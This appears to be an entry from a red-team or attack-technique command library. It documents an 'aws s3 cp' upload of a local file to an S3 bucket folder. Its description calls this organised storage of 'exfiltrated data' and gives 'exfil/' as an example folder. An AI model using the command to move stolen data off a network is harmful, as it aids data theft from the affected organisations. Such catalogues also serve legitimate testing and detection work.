---
id: 52c486d2-86c6-489e-82a4-88d226acd7fe
name: aws s3 copy file to bucket folder
type: command
executor: bash
data: |
  aws s3 cp $FILE s3://$AWS_S3_BUCKET/$FOLDER/
output: null
created_at: '2020-07-31T04:25:22.639303+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - AWS
  - Linux
tags:
  - aws
  - s3
  - upload
verified: true
validated: true
---

# aws s3 copy file to bucket folder

## Command

```bash
aws s3 cp $FILE s3://$AWS_S3_BUCKET/$FOLDER/
```

## Description

This command uploads a local file to a specific folder within an S3 bucket, allowing organized storage of exfiltrated data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $FILE | Local path to the source file | Yes |
| $AWS_S3_BUCKET | Target S3 bucket name | Yes |
| $FOLDER | Destination folder path within the bucket (e.g., exfil/) | Yes |

## Examples

### Basic Usage

```bash
aws s3 cp document.pdf s3://my-bucket/docs/
```

### Advanced Usage

```bash
aws s3 cp /path/to/file s3://my-bucket/archive/2024/ --acl bucket-owner-full-control
```

## Expected Output

Progress indicator and confirmation: "upload: document.pdf to s3://my-bucket/docs/document.pdf".

## Related

- [[procedures/aws-copy-files-or-folder-to-s3-bucket]]
